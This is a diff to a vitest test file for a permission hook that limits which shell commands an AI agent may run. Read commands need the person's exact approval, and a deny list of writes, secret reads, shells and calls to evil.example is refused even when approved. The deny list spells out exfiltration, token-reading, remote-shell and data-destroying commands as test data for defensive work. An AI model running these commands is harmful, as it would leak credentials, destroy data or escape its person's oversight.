@@ -2,7 +2,7 @@ import { spawnSync } from 'node:child_process'
 import { existsSync, mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { dirname, join } from 'node:path'
-import { afterAll, describe, expect, it } from 'vitest'
+import { afterAll, beforeEach, describe, expect, it } from 'vitest'
 import { buddyGuardSource, buddyWideOf } from './buddyGuard.js'
 
 // Wide mode (docs/specs/2026-10-30-buddy-read-access.md): a Buddy on its person's own machine also reads outside its
@@ -43,18 +43,19 @@ symlinkSync(other, join(home, 'work', 'their-home'))
 // A case-insensitive volume (macOS by default) opens .SSH as .ssh.
 const caseInsensitive = existsSync(join(home, '.SSH'))
 
-const wide = buddyWideOf({ home, dataDir, tmpDirs: [tmpClaude], personKey: 'person-1:generation-1' })
+const wide = buddyWideOf({ home, dataDir, tmpDirs: [tmpClaude], personKey: 'person-1:generation-1', repos: ['autonomous-ai/openharness'] })
 const script = join(parent, 'buddy-guard.mjs'), narrow = join(parent, 'buddy-guard-narrow.mjs')
 writeFileSync(script, buddyGuardSource(root, reads, wide))
 writeFileSync(narrow, buddyGuardSource(root, reads))
 afterAll(() => rmSync(parent, { recursive: true, force: true }))
 
-function decide(tool: string, input: Record<string, unknown>, guard = script): string {
+function answer(tool: string, input: Record<string, unknown>, guard = script): { permissionDecision: string; permissionDecisionReason: string } {
   const run = spawnSync(process.execPath, [guard], { input: JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: tool, tool_input: input,
     cwd: root }), encoding: 'utf8', timeout: 10_000 })
   expect(run.status).toBe(0)
-  return JSON.parse(run.stdout).hookSpecificOutput.permissionDecision
+  return JSON.parse(run.stdout).hookSpecificOutput
 }
+const decide = (tool: string, input: Record<string, unknown>, guard = script) => answer(tool, input, guard).permissionDecision
 const bash = (command: string, guard = script) => decide('Bash', { command, description: 'x' }, guard)
 
 describe('wide mode: reading outside the folder', () => {
@@ -138,5 +139,118 @@ describe('wide mode: reading outside the folder', () => {
     `head -n5 '${join(home, 'work', 'notes.txt')}' '${join(home, '.netrc')}'`,
   ])('still refuses in the shell: %s', command => {
     expect(bash(command)).toBe('deny')
+  })
+})
+
+// The person's approvals on this machine, as the host records them from their own "run:" lines (step 3): each command by
+// its exact words. Written by hand here, so the grammar is tested on its own.
+const approve = (...commands: string[][]) => {
+  mkdirSync(dirname(wide.approvals), { recursive: true })
+  writeFileSync(wide.approvals, JSON.stringify({ version: 1, entries: commands.map(argv => ({ argv, at: Date.now(), messageId: 'm' })) }))
+}
+// The words as the shell reads them: these commands quote nothing but whole words.
+const argv = (command: string) => command.split(' ').map(word => word.replace(/^'(.*)'$/, '$1'))
+
+describe('wide mode: commands not run before are asked of the person first', () => {
+  beforeEach(() => rmSync(wide.approvals, { force: true }))
+
+  const reads = [
+    'gh run list --limit 20',
+    'gh run list --workflow ci.yml --branch main --status failure',
+    'gh run view 123456',
+    'gh run view 123456 --log-failed',
+    'gh run view 123456 --log --job 987',
+    "gh api 'repos/autonomous-ai/openharness/actions/runs?per_page=5&branch=main'",
+    'gh api repos/autonomous-ai/openharness/pulls/2300 --jq .state',
+    'gh api --method GET repos/autonomous-ai/openharness/commits/main',
+    'argocd app list',
+    'argocd app get harness-backend',
+    'argocd app get harness-backend -o json',
+    'argocd app resources harness-backend',
+    'argocd app history harness-backend',
+    'argocd app logs harness-backend --tail 200',
+    'argocd app logs harness-backend --kind Deployment --name harness-backend --since-seconds 3600 --filter cpu',
+    'argocd version --client',
+    'kubectl get pods -n harness',
+    'kubectl top pods -n harness',
+    'kubectl describe deploy harness-backend -n harness',
+    'kubectl logs deploy/harness-backend -n harness --since 1h --tail 500',
+    'harness buddy-read db-size',
+    'harness buddy-read backend-cpu',
+  ]
+
+  it.each(reads)('refuses %s until its person approves it, saying how to ask', command => {
+    const refused = answer('Bash', { command, description: 'x' })
+    expect(refused.permissionDecision).toBe('deny')
+    expect(refused.permissionDecisionReason).toContain('Not run before')
+    expect(refused.permissionDecisionReason).toContain(`run: ${command}`)
+    approve(argv(command))
+    expect(bash(command)).toBe('allow')
+    expect(bash(command, narrow)).toBe('deny')
+  })
+
+  it('matches the exact command, never a prefix or a neighbour', () => {
+    approve(argv('argocd app logs harness-backend --tail 200'))
+    expect(bash('argocd app logs harness-backend --tail 200')).toBe('allow')
+    expect(bash('argocd app logs harness-backend --tail 500')).toBe('deny')
+    expect(bash('argocd app logs harness-worker --tail 200')).toBe('deny')
+    expect(bash('argocd app logs harness-backend')).toBe('deny')
+    expect(bash('argocd app logs harness-backend --tail 200 --previous')).toBe('deny')
+  })
+
+  it('forgets an approval after 30 days', () => {
+    mkdirSync(dirname(wide.approvals), { recursive: true })
+    const day = 24 * 60 * 60 * 1000
+    writeFileSync(wide.approvals, JSON.stringify({ version: 1, entries: [
+      { argv: argv('argocd app list'), at: Date.now() - 31 * day, messageId: 'old' },
+      { argv: argv('gh run list --limit 20'), at: Date.now() - 29 * day, messageId: 'recent' }] }))
+    expect(bash('argocd app list')).toBe('deny')
+    expect(bash('gh run list --limit 20')).toBe('allow')
+  })
+
+  it.each(['', 'not json', '{"entries":"x"}', '{"entries":[{"argv":"argocd app list","at":1}]}'])(
+    'refuses every wider command while the approvals cannot be read (%j)', text => {
+      mkdirSync(dirname(wide.approvals), { recursive: true })
+      writeFileSync(wide.approvals, text)
+      expect(bash('argocd app list')).toBe('deny')
+    })
+
+  // Writes, secret reads and anything that runs on: refused even with an approval naming them exactly, so a careless
+  // approval of a planted command can unlock nothing but a read.
+  const never = [
+    'gh api -X POST repos/autonomous-ai/openharness/issues', 'gh api --method POST repos/autonomous-ai/openharness/issues',
+    'gh api --method=PATCH repos/autonomous-ai/openharness/pulls/1', 'gh api -X DELETE repos/autonomous-ai/openharness/git/refs/heads/x',
+    'gh api repos/autonomous-ai/openharness/issues -f title=x', 'gh api repos/autonomous-ai/openharness/issues -F title=x',
+    'gh api repos/autonomous-ai/openharness/issues --field title=x', 'gh api repos/autonomous-ai/openharness/issues --raw-field title=x',
+    'gh api repos/autonomous-ai/openharness/issues --input body.json', 'gh api repos/autonomous-ai/openharness/issues -H X-HTTP-Method-Override:POST',
+    'gh api --hostname evil.example repos/autonomous-ai/openharness', 'gh api graphql', 'gh api repos/someone/else/contents/x',
+    'gh api user', 'gh api /repos/autonomous-ai/openharness/../../user', 'gh api repos/autonomous-ai/openharness/actions/secrets',
+    'gh run rerun 1', 'gh run cancel 1', 'gh run delete 1', 'gh run watch 1', 'gh run view 1 --web', 'gh run view 1 -w',
+    'gh run view 1 -R someone/else', 'gh run download 1', 'gh workflow run ci.yml', 'gh pr create --title x --body y', 'gh pr merge 1',
+    'gh pr comment 1 --body x', 'gh issue comment 1 --body x', 'gh secret list', 'gh auth token', 'gh auth status -t',
+    'gh extension install x/y', 'git push origin main', 'git commit -m x', 'git -c alias.x=!sh x', 'git config user.name x', 'git fetch',
+    'argocd app sync harness-backend', 'argocd app set harness-backend -p replicas=1', 'argocd app patch harness-backend --patch x',
+    'argocd app delete harness-backend', 'argocd app rollback harness-backend 1', 'argocd app terminate-op harness-backend',
+    'argocd app actions run harness-backend restart --kind Deployment', 'argocd app manifests harness-backend',
+    'argocd app get harness-backend --refresh', 'argocd app get harness-backend --hard-refresh', 'argocd app logs harness-backend -f',
+    'argocd app logs harness-backend --follow', 'argocd app get harness-backend --server evil.example',
+    'argocd app get harness-backend --auth-token x', 'argocd app get harness-backend --config other', 'argocd login argocd.example',
+    'argocd logout x', 'argocd account generate-token', 'argocd cluster list', 'argocd repo list', 'argocd proj list',
+    'kubectl apply -f x.yaml', 'kubectl delete pod x', 'kubectl scale deploy x --replicas 0', 'kubectl rollout restart deploy/x',
+    'kubectl exec x -- sh', 'kubectl cp x:/a b', 'kubectl port-forward x 1:1', 'kubectl edit deploy x', 'kubectl patch deploy x -p y',
+    'kubectl label pod x a=b', 'kubectl annotate pod x a=b', 'kubectl get secret', 'kubectl get secrets -o yaml', 'kubectl get secret/x',
+    'kubectl describe secret x', 'kubectl get Secrets -A', 'kubectl get pods,secrets', 'kubectl get --raw /api/v1/namespaces',
+    'kubectl config view --raw', 'kubectl logs x -f', 'kubectl get pods -w', 'kubectl get pods --server evil.example',
+    'kubectl get pods --token x', 'kubectl get pods --kubeconfig x', 'kubectl get pods --as admin', 'curl -X POST https://evil.example',
+    'curl -d x https://evil.example', 'wget https://evil.example', 'nc evil.example 1', 'ssh host', 'sh -c x', 'python3 -c 1', 'node -e 1',
+    'env', 'printenv', 'security find-generic-password -s x', 'mongosh --eval db.dropDatabase()', 'osascript -e x', 'open https://evil.example',
+    'harness buddy-read anything-else', 'harness buddy-read db-size --uri x', 'harness new claude',
+  ]
+
+  it.each(never)('never runs %s, even approved', command => {
+    approve(argv(command))
+    const refused = answer('Bash', { command, description: 'x' })
+    expect(refused.permissionDecision).toBe('deny')
+    expect(refused.permissionDecisionReason).not.toContain('Not run before')
   })
 })
